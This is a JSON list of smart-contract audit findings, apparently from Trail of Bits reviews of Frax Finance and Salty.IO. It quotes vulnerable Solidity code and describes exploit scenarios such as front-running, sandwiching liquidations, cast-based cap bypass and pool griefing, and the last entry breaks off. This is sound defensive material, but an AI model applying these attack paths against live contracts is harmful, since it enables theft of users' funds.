[
    {
        "title": "1. Risk of unexpected results when long-term swaps involving rebasing tokens are canceled ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ22022.pdf",
        "body": "FraxSwaps use of rebasing tokenstokens whose supply can be adjusted to control their pricescould cause transactions to revert after users cancel or withdraw from long-term swaps. FraxSwap oers a new type of swap called a long-term swap, which executes certain swaps over an extended period of time. Users can cancel or withdraw from long-term swaps and recover all of their purchased and unsold tokens. ///@notice stop the execution of a long term order function cancelLongTermSwap(uint256 orderId) external lock execVirtualOrders { (address sellToken, uint256 unsoldAmount, address buyToken, uint256 purchasedAmount) = longTermOrders.cancelLongTermSwap(orderId); bool buyToken0 = buyToken == token0; twammReserve0 -= uint112(buyToken0 ? purchasedAmount : unsoldAmount); twammReserve1 -= uint112(buyToken0 ? unsoldAmount : purchasedAmount); // transfer to owner of order _safeTransfer(buyToken, msg.sender, purchasedAmount); _safeTransfer(sellToken, msg.sender, unsoldAmount); // update order. Used for tracking / informational longTermOrders.orderMap[orderId].isComplete = true; emit CancelLongTermOrder(msg.sender, orderId, sellToken, unsoldAmount, buyToken, purchasedAmount); } Figure 1.1: The cancelLongTermSwap function in the UniV2TWAMMPair contract However, if a rebasing token is used in a long-term swap, the balance of the UniV2TWAMMPair contract could increase or decrease over time. Such changes in the contracts balance could result in unintended eects when users try to cancel or withdraw from long-term swaps. For example, because all long-term swaps for a pair are processed as part of any function with the execVirtualOrders modier, if the actual balance of the UniV2TWAMMPair is reduced as part of one or more rebases in the underlying token, this balance will not be reected correctly in the contracts internal accounting, and cancel and withdraw operations will transfer too many tokens to users. Eventually, this will exhaust the contracts balance of the token before all users are able to withdraw, causing these transactions to revert. Exploit Scenario Alice creates a long-term swap; one of the tokens to be swapped is a rebasing token. After some time, the tokens supply is adjusted, causing the balance of UniV2TWAMMPair to decrease. Alice tries to cancel the long-term swap, but the internal bookkeeping for her swap was not updated to reect the rebase, causing the token transfer from the contract to Alice to revert and blocking her other token transfers from completing. To allow Alice to access funds and to allow subsequent transactions to succeed, some tokens need to be explicitly sent to the UniV2TWAMMPair contract to increase its balance. Recommendations Short term, explicitly document issues involving rebasing tokens and long-term swaps to ensure that users are aware of them. Long term, evaluate the security risks surrounding ERC20 tokens and how they could aect every system component. References  Common errors with rebasing tokens on Uniswap V2",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Missing liquidity checks when initiating long-term swaps ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ22022.pdf",
        "body": "When a long-term swap is submitted to a UniV2TWAMMPair instance, the code performs checks, such as those ensuring that the selling rate of a given token is nonzero, before the order is recorded. However, the code does not validate the existing reserves for the tokens being bought in long-term swaps. ///@notice adds long term swap to order pool function performLongTermSwap(LongTermOrders storage longTermOrders, address from, address to, uint256 amount, uint256 numberOfTimeIntervals) private returns (uint256) { // make sure to update virtual order state (before calling this function) //determine the selling rate based on number of blocks to expiry and total amount uint256 currentTime = block.timestamp; uint256 lastExpiryTimestamp = currentTime - (currentTime % longTermOrders.orderTimeInterval); uint256 orderExpiry = longTermOrders.orderTimeInterval * (numberOfTimeIntervals + 1) + lastExpiryTimestamp; uint256 sellingRate = SELL_RATE_ADDITIONAL_PRECISION * amount / (orderExpiry - currentTime); require(sellingRate > 0); // tokenRate cannot be zero Figure 2.1: Uniswap_V2_TWAMM/twamm/LongTermOrders.sol#L118-L128 If a long-term swap is submitted before adequate liquidity has been added to the pool, the next pool operation will attempt to trade against inadequate liquidity, resulting in a division-by-zero error in the line highlighted in blue in gure 2.2. As a result, all pool operations will revert until the number of tokens needed to begin executing the virtual swap are added. ///@notice computes the result of virtual trades by the token pools function computeVirtualBalances( uint256 token0Start, uint256 token1Start, uint256 token0In, uint256 token1In) internal pure returns (uint256 token0Out, uint256 token1Out, uint256 ammEndToken0, uint256 ammEndToken1) { token0Out = 0; token1Out = 0; //when both pools sell, we use the TWAMM formula else { uint256 aIn = token0In * 997 / 1000; uint256 bIn = token1In * 997 / 1000; uint256 k = token0Start * token1Start; ammEndToken1 = token0Start * (token1Start + bIn) / (token0Start + aIn); ammEndToken0 = k / ammEndToken1; token0Out = token0Start + aIn - ammEndToken0; token1Out = token1Start + bIn - ammEndToken1; } Figure 2.2: Uniswap_V2_TWAMM/twamm/ExecVirtualOrders.sol#L39-L78 The long-term swap functionality can be paused by the contract owner (e.g., to prevent long-term swaps when a pool has inadequate liquidity); however, by default, the functionality is enabled when a new pool is deployed. An attacker could exploit this fact to grief a newly deployed pool by submitting long-term swaps early in its lifecycle when it has minimal liquidity. Additionally, even if a newly deployed pool is already loaded with adequate liquidity, a user could submit long-term swaps with zero intervals to trigger an integer underow in the line highlighted in red in gure 2.2. However, note that the user would have to submit at least one long-term swap that requires more than the total liquidity in the reserve: testSync(): failed! Call sequence:     initialize(6809753114178753104760,5497681857357274469621,837982930770660231771 7,10991961728915299510446) longTermSwapFrom1To0(2,0) testLongTermSwapFrom0To1(23416246225666705882600004967801889944504351201487667 6541160061227714669,0) testSync() Time delay: 37073 seconds Block delay: 48 Figure 2.3: The Echidna output that triggers a revert in a call to sync() Exploit Scenario A new FraxSwap pool is deployed, causing the long-term swap functionality to be unpaused. Before users have a chance to add sucient liquidity to the pool, Eve initiates long-term swaps in both directions. Since there are no tokens available to purchase, all pool operations revert, and the provided tokens are trapped. At this point, adding more liquidity is not possible since doing so also triggers the long-term swap computation, forcing a revert. Recommendations Short term, disable new swaps and remove all the liquidity in the deployed contracts. Modify the code so that, moving forward, liquidity can be added without executing long-term swaps. Document the pool state requirements before long-term swaps can be enabled. Long term, use extensive smart contract fuzzing to test that important operations cannot be blocked.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Missing events in several contracts ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ22022.pdf",
        "body": "An insucient number of events is declared in the Frax Finance contracts. As a result, malfunctioning contracts or malicious attacks may not be noticed. For instance, long-term swaps are executed in batches by the executeVirtualOrdersUntilTimestamp function: ///@notice executes all virtual orders until blockTimestamp is reached. function executeVirtualOrdersUntilTimestamp(LongTermOrders storage longTermOrders, uint256 blockTimestamp, ExecuteVirtualOrdersResult memory reserveResult) internal { uint256 nextExpiryBlockTimestamp = longTermOrders.lastVirtualOrderTimestamp - (longTermOrders.lastVirtualOrderTimestamp % longTermOrders.orderTimeInterval) + longTermOrders.orderTimeInterval; //iterate through time intervals eligible for order expiries, moving state forward OrderPool storage orderPool0 = longTermOrders.OrderPool0; OrderPool storage orderPool1 = longTermOrders.OrderPool1; while (nextExpiryBlockTimestamp < blockTimestamp) { // Optimization for skipping blocks with no expiry if (orderPool0.salesRateEndingPerTimeInterval[nextExpiryBlockTimestamp] > 0 || orderPool1.salesRateEndingPerTimeInterval[nextExpiryBlockTimestamp] > 0) { //amount sold from virtual trades uint256 blockTimestampElapsed = nextExpiryBlockTimestamp - longTermOrders.lastVirtualOrderTimestamp; uint256 token0SellAmount = orderPool0.currentSalesRate * blockTimestampElapsed / SELL_RATE_ADDITIONAL_PRECISION; uint256 token1SellAmount = orderPool1.currentSalesRate * blockTimestampElapsed / SELL_RATE_ADDITIONAL_PRECISION; (uint256 token0Out, uint256 token1Out) = executeVirtualTradesAndOrderExpiries(reserveResult, token0SellAmount, token1SellAmount); orderPool1, token0Out, token1Out, nextExpiryBlockTimestamp); updateOrderPoolAfterExecution(longTermOrders, orderPool0, } nextExpiryBlockTimestamp += longTermOrders.orderTimeInterval; } //finally, move state to current blockTimestamp if necessary if (longTermOrders.lastVirtualOrderTimestamp != blockTimestamp) { //amount sold from virtual trades uint256 blockTimestampElapsed = blockTimestamp - longTermOrders.lastVirtualOrderTimestamp; uint256 token0SellAmount = orderPool0.currentSalesRate * blockTimestampElapsed / SELL_RATE_ADDITIONAL_PRECISION; uint256 token1SellAmount = orderPool1.currentSalesRate * blockTimestampElapsed / SELL_RATE_ADDITIONAL_PRECISION; (uint256 token0Out, uint256 token1Out) = executeVirtualTradesAndOrderExpiries(reserveResult, token0SellAmount, token1SellAmount); updateOrderPoolAfterExecution(longTermOrders, orderPool0, orderPool1, token0Out, token1Out, blockTimestamp); } } Figure 3.1: Uniswap_V2_TWAMM/twamm/LongTermOrders.sol#L216-L252 However, despite the complexity of this function, it does not emit any events; it will be dicult to monitor issues that may arise whenever the function is executed. Additionally, important operations in the FPIControllerPool and CPITrackerOracle contracts do not emit any events: function toggleMints() external onlyByOwnGov { mints_paused = !mints_paused; } function toggleRedeems() external onlyByOwnGov { redeems_paused = !redeems_paused; } function setFraxBorrowCap(int256 _frax_borrow_cap) external onlyByOwnGov { frax_borrow_cap = _frax_borrow_cap; } function setMintCap(uint256 _fpi_mint_cap) external onlyByOwnGov { fpi_mint_cap = _fpi_mint_cap; } Figure 3.2: FPI/FPIControllerPool.sol#L528-L542 Events generated during contract execution aid in monitoring, baselining of behavior, and detection of suspicious activity. Without events, users and blockchain-monitoring systems cannot easily detect behavior that falls outside the baseline conditions, and it will be dicult to review the correct behavior of the contracts once they have been deployed. Exploit Scenario Eve, a malicious user, discovers a vulnerability that allows her to manipulate long-term swaps. Because no events are generated from her actions, the attack goes unnoticed. Eve uses her exploit to drain liquidity or prevent other users from swapping before the Frax Finance team has a chance to respond. Recommendations Short term, emit events for all operations that may contribute to a higher level of monitoring and alerting, even internal ones. Long term, consider using a blockchain-monitoring system to track any suspicious behavior in the contracts. A monitoring mechanism for critical events could quickly detect system compromises.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Unsafe integer conversions in FPIControllerPool ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ22022.pdf",
        "body": "Explicit integer conversions can be used to bypass certain restrictions (e.g., the borrowing cap) in the FPIControllerPool contract. The FPIControllerPool contract allows certain users to either borrow or repay FRAX within certain limits (e.g., the borrowing cap): // Lend the FRAX collateral to an AMO function giveFRAXToAMO(address destination_amo, uint256 frax_amount) external onlyByOwnGov validAMO(destination_amo) { int256 frax_amount_i256 = int256(frax_amount); // Update the balances first require((frax_borrowed_sum + frax_amount_i256) <= frax_borrow_cap, \"Borrow frax_borrowed_balances[destination_amo] += frax_amount_i256; frax_borrowed_sum += frax_amount_i256; // Give the FRAX to the AMO TransferHelper.safeTransfer(address(FRAX), destination_amo, frax_amount); cap\"); } // AMO gives back FRAX. Needed for proper accounting function receiveFRAXFromAMO(uint256 frax_amount) external validAMO(msg.sender) { int256 frax_amt_i256 = int256(frax_amount); // Give back first TransferHelper.safeTransferFrom(address(FRAX), msg.sender, address(this), frax_amount); // Then update the balances frax_borrowed_balances[msg.sender] -= frax_amt_i256; frax_borrowed_sum -= frax_amt_i256; } Figure 4.1: The giveFRAXToAMO function in FPIControllerPool.sol However, these functions explicitly convert these variables from uint256 to int256; these conversions will never revert and can produce unexpected results. For instance, if frax_amount is set to a very large unsigned integer, it could be cast to a negative number. Malicious users could exploit this fact by adjusting the variables to integers that will bypass the limits imposed by the code after they are cast. The same issue aects the implementation of price_info: // Get additional info about the peg status function price_info() public view returns ( int256 collat_imbalance, uint256 cpi_peg_price, uint256 fpi_price, uint256 price_diff_frac_abs ) { fpi_price = getFPIPriceE18(); cpi_peg_price = cpiTracker.currPegPrice(); uint256 fpi_supply = FPI_TKN.totalSupply(); if (fpi_price > cpi_peg_price){ collat_imbalance = int256(((fpi_price - cpi_peg_price) * fpi_supply) / PRICE_PRECISION); price_diff_frac_abs = ((fpi_price - cpi_peg_price) * PEG_BAND_PRECISION) / fpi_price; } else { collat_imbalance = -1 * int256(((cpi_peg_price - fpi_price) * fpi_supply) / PRICE_PRECISION); price_diff_frac_abs = ((cpi_peg_price - fpi_price) * PEG_BAND_PRECISION) / fpi_price; } } Figure 4.2: The price_info function in FPIControllerPool.sol Exploit Scenario Eve submits a governance proposal that can increase the amount of FRAX that can be borrowed. The voters approve the proposal because they believe that the borrowing cap will stop Eve from changing it to a larger value. Recommendations Short term, add checks to the relevant functions to validate the results of explicit integer conversions to ensure that they are within the expected range. Long term, use extensive smart contract fuzzing to test that system invariants cannot be broken.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. leveragedPosition and repayAssetWithCollateral do not update the exchangeRate ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ22022.pdf",
        "body": "Some FraxLend functions do not update the exchange rate, allowing insolvent users to call them. The FraxLend platform oers various operations, such as leveragedPosition and repayAssetWithCollateral, for users to borrow funds as long as they are solvent. The solvency check is implemented by the isSolvent modier, which runs at the end of such operations: /// @notice Checks for solvency AFTER executing contract code /// @param _borrower The borrower whose solvency we will check modifier isSolvent(address _borrower) { _; require(_isSolvent(_borrower, exchangeRateInfo.exchangeRate), \"FraxLendPair: user is insolvent\"); } Figure 5.1: The isSolvent modier in the FraxLendCore contract However, this modier is not enough to ensure solvency since the exchange rate changes over time, which can make previously solvent users insolvent. That is why it is important to force an update of the exchange rate during any operation that allows users to borrow funds: function updateExchangeRate() public returns (uint256 _exchangeRate) { ExchangeRateInfo memory _exchangeRateInfo = exchangeRateInfo; if (_exchangeRateInfo.lastTimestamp == block.timestamp) return _exchangeRate = _exchangeRateInfo.exchangeRate;  // write to storage _exchangeRateInfo.exchangeRate = uint224(_exchangeRate); _exchangeRateInfo.lastTimestamp = uint32(block.timestamp); exchangeRateInfo = _exchangeRateInfo; emit UpdateExchangeRate(_exchangeRate); } Figure 5.2: Part of the updateExchangeRate function in the FraxLendCore contract However, the leveragedPosition and repayAssetWithCollateral operations increase the debt of the caller but do not call updateExchangeRate; therefore, they will perform the solvency check with old information. Exploit Scenario Eve, a malicious user, notices a drop in the collateral price. She calls leveragedPosition or repayAssetWithCollateral to borrow more than the amount of shares/collateral she should be able to. Recommendations Short term, add a call to updateExchangeRate in every function that increases users debt. Long term, document the invariants and preconditions for every function and use extensive smart contract fuzzing to test that system invariants cannot be broken.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Risk of hash collisions in FraxLendPairDeployer that could block certain deployments ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ22022.pdf",
        "body": "A hash collision could occur in the FraxLendPairDeployer contract, allowing unauthenticated users to block the deployment of certain contracts from authenticated users. The FraxLendPairDeployer contract allows any user to deploy certain contracts using the deploy function, which creates a contract name based on certain parameters: function deploy( address _asset, address _collateral, address _oracleTop, address _oracleDiv, uint256 _oracleNormalization, address _rateContract, bytes calldata _rateInitCallData ) external returns (address _pairAddress) { string memory _name = string( abi.encodePacked( \"FraxLendV1-\", IERC20(_collateral).safeName(), \"/\", IERC20(_asset).safeName(), \" - \", IRateCalculator(_rateContract).name(), \" - \", deployedPairsArray.length + 1 ) );  Figure 6.1: The header of the deploy function in the FraxLendPairDeployer contract The _deploySecond function creates a hash of this contract name and checks it to ensure that it has not already been deployed: function _deploySecond( string memory _name, address _pairAddress, address _asset, address _collateral, uint256 _maxLTV, uint256 _liquidationFee, address _oracleTop, address _oracleDiv, uint256 _oracleNormalization, address _rateContract, bytes memory _rateInitCallData, address[] memory _approvedBorrowers, address[] memory _approvedLenders ) private {  bytes32 _nameHash = keccak256(bytes(_name)); require(deployedPairsByName[_nameHash] == address(0), \"FraxLendPairDeployer: Pair name must be unique\"); deployedPairsByName[_nameHash] = _pairAddress;  Figure 6.2: Part of the _deploySecond function in the FraxLendPairDeployer contract Both authenticated and unauthenticated users can use this code to deploy contracts, but only authenticated users can select any name for contracts they want to deploy. Additionally, the _deployFirst function computes a salt based on certain parameters: function _deployFirst( address _asset, address _collateral, uint256 _maxLTV, uint256 _liquidationFee, address _oracleTop, address _oracleDiv, uint256 _oracleNormalization, address _rateContract, bytes memory _rateInitCallData, bool _isBorrowerWhitelistActive, bool _isLenderWhitelistActive ) private returns (address _pairAddress) { { //clones are distinguished by their data bytes32 salt = keccak256( abi.encodePacked( _asset, _collateral, _maxLTV, _liquidationFee, _oracleTop, _oracleDiv, _oracleNormalization, _rateContract, _rateInitCallData, _isBorrowerWhitelistActive, _isLenderWhitelistActive ) ); require(deployedPairsBySalt[salt] == address(0), \"FraxLendPairDeployer: Pair already deployed\");  Figure 6.3: The header of the _deployFirst function in the FraxLendPairDeployer contract Again, both authenticated and unauthenticated users can use this code, but some parameters are xed for unauthorized users (e.g., _maxLTV will always be DEFAULT_MAX_LTV and cannot be changed). However, in both cases, a hash collision could block contracts from being deployed. For example, if an unauthenticated user sees an authenticated users pending transaction to deploy a contract, he could deploy his own contract with a name or parameters that result in a hash collision, preventing the authenticated users contract from being deployed. Exploit Scenario Alice, an authenticated user, starts a custom deployment with certain parameters. Eve, a malicious user, sees Alices unconrmed transactions and front-runs them with her own call to deploy a contract with similar parameters. Eves transaction succeeds, causing Alices deployment to fail and forcing her to change either the contracts name or the parameters of the call to deploy. Recommendations Short term, prevent collisions between dierent types of deployments. Long term, review the permissions and capabilities of authenticated and unauthenticated users in every component.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Risk of denial-of-service attacks on token whitelisting process ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf",
        "body": "The token whitelisting process can be disrupted by a malicious user submitting spurious proposals. The proposeTokenWhitelisting function allows users to submit proposals for adding new tokens to the whitelist. If the requirements are met, it creates a unique proposal and includes it in the pending whitelisting proposals list. 121 function proposeTokenWhitelisting( IERC20 token, string memory tokenIconURL, string memory description ) public nonReentrant 122 123 124 125 { require( address(token) != address(0), \"token cannot be address(0)\" ); require( _openBallotsForTokenWhitelisting.length() < daoConfig.maxPendingTokensForWhitelisting(), \"The maximum number of token whitelisting proposals are already pending\" ); 126 require( poolsConfig.numberOfWhitelistedPools() < poolsConfig.maximumWhitelistedPools(), \"Maximum number of whitelisted pools already reached\" ); 127 require( ! poolsConfig.tokenHasBeenWhitelisted(token, exchangeConfig.wbtc(), exchangeConfig.weth()), \"The token has already been whitelisted\" ); 128 129 string memory ballotName = string.concat(\"whitelist:\", Strings.toHexString(address(token)) ); 130 131 uint256 ballotID = _possiblyCreateProposal( ballotName, BallotType.WHITELIST_TOKEN, address(token), 0, tokenIconURL, description, 2 * daoConfig.baseProposalCost() ); 132 133 _openBallotsForTokenWhitelisting.add( ballotID ); } Figure 1.1: src/dao/Proposals.sol#L121-L133 17 Salty.IO Security Assessment However, the maximum number of queueable token whitelisting proposals is currently capped at ve, which can be extended to a maximum of 12. This presents a potential vulnerability to denial-of-service attacks, as a malicious actor could persistently submit meaningless tokens to saturate the queue, thereby preventing legitimate token whitelisting proposals. 49 time. 50 51 // The maximum number of tokens that can be pending for whitelisting at any // Range: 3 to 12 with an adjustment of 1 uint256 public maxPendingTokensForWhitelisting = 5; Figure 1.2: src/dao/DAOConfig.sol#L49-L51 Furthermore, since voters may lack incentive to downvote these fraudulent proposals, the required quorum may never be reached to nalize the ballot, eectively blocking the service for an extended duration. Submitting a proposal requires a nonrefundable fee that is currently set at $500, which should prevent most frivolous attackers. However, this will not stop a motivated, well-funded attacker such as a competitor. Exploit Scenario When the Salty.IO protocol is deployed, Eve submits multiple proposals to whitelist fake tokens. These proposals ll up the queue, eectively obstructing the inclusion of genuine token whitelisting proposals in the queue. Once the protocol is able to get a quorum to remove one of the proposals, Eves bot immediately back runs the transaction with another proposal. Recommendations Short term, implement a mechanism that allows an authorized entity to remove undesirable or unwanted token whitelisting proposals from the queue of proposals. Alternatively, implement a larger sized deposit that would be returned to a legitimate proposer. Long term, review critical codebase operations to ensure consistent and comprehensive logging of essential information, promoting transparency, troubleshooting, and ecient system management. 18 Salty.IO Security Assessment 2. Insu\u0000cient event generation Severity: Informational Diculty: Low Type: Auditing and Logging Finding ID: TOB-SALTY-2 Target: src/*",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "3. Transactions to add liquidity may be front run ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf",
        "body": "Even with a properly set slippage guard, a depositor calling addLiquidity can be front run by a sole liquidity holder, which would cause the depositor to lose funds. When either of the reserves of a pool is less than the dust (100 wei), any call to addLiquidity will cause the pool to reset the reserves ratio. // If either reserve is less than dust then consider the pool to be empty and that the added liquidity will become the initial token ratio if ( ( reserve0 <= PoolUtils.DUST ) || ( reserve1 <= PoolUtils.DUST ) ) { // Update the reserves reserves.reserve0 += maxAmountA; reserves.reserve1 += maxAmountB; return ( maxAmountA, maxAmountB, Math.sqrt(maxAmountA * maxAmountB) ); } Figure 3.1: src/pools/Pools.sol#L112-L120 Exploit Scenario Eve is the sole liquidity holder in the WETH/DAI pool, which has reserves of 100 WETH and 200,000 DAI, for a ratio of 1:2,000. 1. Alice submits a transaction to add 10 WETH and 20,000 DAI of liquidity. 2. Eve front runs Alices transaction with a removeLiquidity transaction that brings one of the reserves down to close to zero. 3. As the last action of her transaction, Eve adds liquidity, but because one of the reserves is close to zero, whatever ratio she adds to the pool becomes the new reserves ratio. In this example, Eve adds the ratio 10:2,000 (representing a WETH price of 200 DAI). 4. Alices addLiquidity transaction goes through, but because of the new K ratio, the logic lets her add only 10 WETH and 2,000 DAI. The liquidity slippage guard does not 20 Salty.IO Security Assessment work because the reserves ratio has been reset. In nominal terms, Alice actually receives more liquidity than she would have at the previous ratio. 5. Eve back runs this transaction with a swap transaction that buys most of the WETH that Alice just deposited for a starting price of 200 DAI. Eve then removes her liquidity, eectively stealing Alices 10 WETH for a fraction of the price. Recommendations Short term, add a mechanism to prevent reserves from dropping below dust levels. Long term, carefully assess invariants and situations in which front-running may aect functionality. Invariant testing would be useful for this. 21 Salty.IO Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Whitelisted pools may exceed the maximum allowed ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf",
        "body": "The number of whitelisted pools may exceed the maximum number allowed because there is no check against the current length of whitelistedPools when the maximum number of whitelistedPools is decreased via a proposal. function changeMaximumWhitelistedPools(bool increase) public onlyOwner { if (increase) { if (maximumWhitelistedPools < 100) maximumWhitelistedPools += 10; } else { if (maximumWhitelistedPools > 20) maximumWhitelistedPools -= 10; } } Figure 4.1: src/pools/PoolsConfig.sol#L59-L72 Exploit Scenario The current maximumWhitelistedPools is set to 20, and the current number of whitelisted pools is 20. A proposal that decreases the maximum number of pools to 10 is approved, so maximumWhitelistedPools becomes 10. There are three other proposals to whitelist new tokens, which all pass, creating six new whitelisted pools. This brings the total number of whitelisted pools to 26, while the maximum is 10. In order to add a new whitelisted pool, two new proposals must pass that each increase the maximum by 10. Recommendations Short term, add a check of the current number of pools and the number of proposals for adding new tokens; the check should run before the maximum is changed and before proposals to whitelist tokens are accepted. Long term, design a specication that identies the boundaries for all parameters along with requirements as to how situations such as these should be handled. 22 Salty.IO Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Any user can add liquidity to any pool and bypass the token whitelist ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf",
        "body": "The absence of token whitelist checks within the addLiquidity function allows any user to create trading pairs, including pairs with malicious tokens, and to provide liquidity for arbitrary token pairs. This vulnerability may expose the protocol to potential reentrancy attacks, thereby resulting in the potential loss of funds for users who provide liquidity for the pool. Furthermore, the lack of authorization checks on this function allows users from blacklisted regions to directly call addLiquidity on a pool, bypassing the AccessManager access control and associated geolocation check. // Add liquidity for the specified trading pair (must be whitelisted) function addLiquidity( IERC20 tokenA, IERC20 tokenB, uint256 maxAmountA, uint256 maxAmountB, uint256 minLiquidityReceived, uint256 deadline ) public nonReentrant ensureNotExpired(deadline) returns (uint256 addedAmountA, uint256 addedAmountB, uint256 addedLiquidity) { require( exchangeConfig.initialDistribution().bootstrapBallot().startExchangeApproved(), \"The exchange is not yet live\" ); require( address(tokenA) != address(tokenB), \"Cannot add liquidity for duplicate tokens\" ); Figure 5.1: The addLiquidity function for the Liquidity contract (src/pools/Pools.sol#L149-L177) Exploit Scenario Alice creates a trading pair using a malicious token. The malicious token pair allows attackers to perform reentrancy attacks and to steal funds from Alice, who provides liquidity in the associated pool. Recommendations Short term, add the appropriate token whitelist and user authorization checks to the addLiquidity function. Long term, review critical operations in the codebase and ensure that proper access control mechanisms are put in place. 23 Salty.IO Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Liquidation fee is volatile and may be manipulated ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf",
        "body": "The liquidation reward is intended to be 5% of the liquidity seized, but in actuality, it may range from close to 0% to close to 10%. The Salty.IO liquidation process is straightforward. When the loan-to-value (LTV) ratio of a loan drops below the threshold, liquidateUser may be called by anyone, and it will immediately liquidate the loan by removing the liquidity, seizing the WBTC and WETH, and paying a fee to the caller. The fee is intended to be 5% of the amount liquidated, which is estimated as 10% of the WETH seized. This assumes the WETH and WBTC will be equal in value. However, due to market forces, the actual ratio of values will diverge from 50:50 even if that was the ratio of the values of the initial deposit. // Liquidate a position which has fallen under the minimum collateral ratio. // A default 5% of the value of the collateral is sent to the caller, with the rest being sent to the Liquidator for later conversion to USDS which is then burned. function liquidateUser( address wallet ) public nonReentrant  // The caller receives a default 5% of the value of the liquidated collateral so we can just send them default 10% of the reclaimedWETH (as WBTC/WETH is a 50/50 pool). uint256 rewardedWETH = (2 * reclaimedWETH * stableConfig.rewardPercentForCallingLiquidation()) / 100;  // Reward the caller weth.safeTransfer( msg.sender, rewardedWETH ); Figure 6.1: src/stable/Collateral.sol#L144-L184 The value of WETH can be further manipulated by sandwiching a call to liquidateUser with a WBTC/WETH swap transaction, which could push the reserves of either token to 24 Salty.IO Security Assessment close to the dust amount. This could double the amount of WETH received by the liquidator; alternatively, it could reduce the amount of WETH to almost zero. Users who want to add liquidity, called LPs, and participate in LP staking rewards are expected to call the Liquidity contract; however, a user could also call addLiquidity directly on a pool, bypassing the AccessManager access control and associated geolocation check. Furthermore, a user may believe that by doing so they will participate in the arbitrage prot rewards, but in fact, they will not. Exploit Scenario Alice takes out a loan of USDS against her WBTC/WETH. Subsequently, Eve notices the LTV of the loan is below the threshold. She submits a transaction: 1. It rst swaps WETH for a signicant amount of WBTC from the collateral pool. 2. It then calls liquidateUser, and due to the estimate based on WETH, Alice receives signicantly more WETH than she was entitled to. 3. Finally, it unwinds the swap from step 1. Recommendations Short term, instead of estimating the fee as two times the WETH amount, have the liquidateUser function send the exact amount of WETH and WBTC to the liquidator. Long term, create a specication for all major workows with clear denitions and expectations for each process. 25 Salty.IO Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. Collateral contract deployment results in permanent loss of rewards ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf",
        "body": "Anyone who provides liquidity to the collateral pool (also known as the WETH/WBTC pool) will not earn rewards, and any arbitrage prots allocated to the pool will be permanently lost. The Collateral contract is deployed separately from the Liquidity contract; however, only liquidity in the Liquidity contract can claim rewards. This arises because the Liquidity contract is the sole contract seeded with SALT rewards. As shown in gure 7.1, the performUpkeep function, which is responsible for sending rewards to the relevant contract, references only stakingRewards, which is congured as the address of the Liquidity contract; it completely overlooks the Collateral contract. This means that rewards intended for the collateral pool are misdirected, as they should properly be sent to the Collateral contract. // Transfer a percent (default 1% per day) of the currently held rewards to the specified StakingRewards pools. // The percentage to transfer is interpolated from how long it's been since the last performUpkeep(). function performUpkeep( uint256 timeSinceLastUpkeep, bool isStaking ) public  // Add the rewards so that they can later be claimed by the users proportional to their share of the StakingRewards derived contract( Staking, Liquidity or Collateral) stakingRewards.addSALTRewards( addedRewards ); } Figure 7.1: In the above code, stakingRewards refers to the Liquidity contract. (src/rewards/RewardsEmitter.sol#L80-L138) If an actual collateral pool liquidity holder calls claimAllRewards on the Collateral contract, then it will revert because there are no rewards in the contract. If the user calls 26 Salty.IO Security Assessment claimAllRewards on the Liquidity contract, it will revert because the user has no liquidity as far as the Liquidity contract is concerned. Exploit Scenario The protocol is deployed, and Alice adds liquidity to the collateral pool. Over time, the pool accumulates arbitrage fees. Alice is unable to claim any rewards, and the rewards that are sent to the pool are permanently lost. Recommendations Short term, combine the Liquidity and Collateral contracts into one. Long term, create a specication for all contracts with clear denitions and expectations for each process. 27 Salty.IO Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "8. Collateral can be withdrawn without repaying USDS loan ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf",
